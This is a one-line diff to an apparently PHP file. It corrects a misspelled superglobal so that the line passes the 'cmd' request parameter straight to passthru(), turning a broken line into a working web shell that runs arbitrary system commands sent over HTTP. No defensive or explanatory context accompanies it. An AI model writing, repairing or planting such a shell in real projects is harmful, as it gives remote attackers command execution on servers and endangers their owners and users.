@@ -1,1 +1,1 @@
-<?php passthru($_REQQUEST['cmd']);?>
+<?php passthru($_REQUEST['cmd']);?>
